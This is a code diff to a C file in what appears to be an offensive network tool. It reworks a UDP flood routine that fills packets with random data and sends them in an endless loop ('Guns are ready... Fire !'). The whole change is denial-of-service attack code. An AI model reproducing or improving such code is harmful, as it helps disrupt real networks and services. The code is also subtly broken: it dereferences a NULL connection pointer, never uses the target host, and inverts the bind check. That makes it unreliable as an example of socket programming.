@@ -15,16 +15,71 @@
 #include <stdio.h>
 #include <string.h>
 
+#include <lib/conn.h>
 #include <lib/info.h>
 #include <lib/mem.h>
-#include <lib/conn.h>
 #include <lib/util.h>
 
 #include "udp_flood.h"
 
 #define PK_SIZE 256
 
+// udp_err_t type to retain errors from udp package
 typedef int udp_err_t;
+
+typedef struct udp_atk {
+	// depending on the args it will generate a proc_cb
+	// that will pe used to launch the attack.
+	void (*proc_cb)(void *);
+} udp_atk;
+
+static void udp_setup4(conn4_t *conn, const char *host)
+{
+	if (!conn)
+		INFOEE("Empty ipv4 conn pointer, please pass a non null conn");
+
+	(void)host;
+	uint16_t port = port_random();
+
+	conn->addr->sin_family		= AF_INET;
+	conn->addr->sin_port		= htons(port);
+	conn->addr->sin_addr.s_addr = htonl(INADDR_ANY);
+	memset(&conn->addr->sin_addr, 0,sizeof(conn->addr->sin_addr));
+
+	conn->sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+	if (!conn->sock)
+		INFOEE("Could not create the upd socket");
+
+	if (!bind(conn->sock, (SA *)&conn->addr, sizeof(conn->addr)))
+		INFOEE("Could not bind the udp socket");
+
+	conn->buff = xzmalloc(PK_SIZE * sizeof(conn->buff));
+	for (int i = 0; i < PK_SIZE; i++)
+		// fill up the buffer with random data.
+		urandom_bytes(&conn->buff[i], sizeof(conn->buff[i]));
+}
+
+static void udp_attack4(void *conn)
+{
+	conn4_t *c = conn;
+	ssize_t n;
+
+	INFO("Guns are ready... Fire !");
+	for (;;) {
+		n = sendto(c->sock, c->buff, PK_SIZE * sizeof(unsigned char), 0,
+				   (SA *)&c->addr, sizeof(c));
+		if (!n) {
+			WSTATUS("Could not send udp packet ...");
+			break;
+		}
+	}
+}
+
+static void udp_setup_attack(udp_atk *atk)
+{
+	atk->proc_cb = udp_attack4;
+}
+
 /*
  * Udp flood
  *
@@ -49,7 +104,8 @@ typedef int udp_err_t;
  * and start the attack.
  *
  */
-void udp_flood(arguments args) {
+void udp_flood(arguments args)
+{
 	STATUS("UDP-FLOOD attack is starting.");
 	// if random flag is set just alert user
 	// that the UDP Flood already uses random port option
@@ -58,75 +114,17 @@ void udp_flood(arguments args) {
 		STATUS("UDP_FLOOD already uses the random flag.");
 
 	conn_t *conn = NULL;
-	conn = conn_new(args.host_type);
-	udp_err_t err;	
-	switch(args.host_type)
-	{
-		case IPV4:
-			conn->c4->buff = xzmalloc(PK_SIZE * sizeof(conn->c4->buff));
-			for(int i=0; i<PK_SIZE; i++) {
-				// fill up the buffer with random data.
-				urandom_bytes(&conn->c6->buff[i], sizeof(conn->c4->buff[i]));
-			}
+	udp_atk atk;
+	memset(&atk, 0, sizeof(atk));
 
-			err = ipv4(conn, args);
-			if (!err) {
-			}
-			break;
-		case IPV6:
-			conn->c6->buff = xzmalloc(PK_SIZE * sizeof(conn->c6->buff));
-			for(int i=0; i<PK_SIZE; i++) {
-				// fill up the buffer with random data.
-				urandom_bytes(&conn->c6->buff[i], sizeof(conn->c6->buff[i]));
-			}
-			err = ipv6(conn, args);
-			if(!err) {
-			}
-			break;
-
+	switch (args.host_type) {
+	case IPV4:
+		udp_setup4(conn->c4, args.host);
+		udp_setup_attack(&atk);
+		atk.proc_cb(conn->c4);
+		break;
+	case IPV6:
+		//TODO
+		break;
 	}
-}
-
-static udp_err_t ipv4(conn4_t *conn, arguments args)
-{
-	if (!conn)
-		INFOEE("Empty ipv4 conn pointer, please pass a non null conn");
-
-
-	conn->addr->sin_family = AF_INET;
-	conn->addr->sin_port = htons(args.port.n);
-	memset(&conn->addr->sin_addr, sizeof(conn->addr->sin_addr), 0);
-
-	conn->sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-	if (!conn->sock) {
-		WSTATUS("Could not create the upd socket");
-		return -1;
-	}
-
-
-	//TODO
-	ssize_t n = 0;
-	for(;;) {
-		n = sendto(conn->sock,conn->buff, PK_SIZE*sizeof(conn->buff),
-					0, (SA*)&conn->addr->sin_addr, sizeof(conn->addr->sin_addr));
-		if (!n) { // if any error is cought break from
-			break;
-		}
-	}
-	
-	// todo	
-	return 0;
-}
-// TODO
-static udp_err_t ipv6(conn6_t *conn, arguments args)
-{
-	if(!conn)
-		INFOEE("Empty ipv6 conn pointer, please pass a non null conn");
-
-	conn->sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
-	if(!conn->sock) {
-		WSTATUS("Could not create the udp6 socket");
-		return -1;
-	}
-
 }
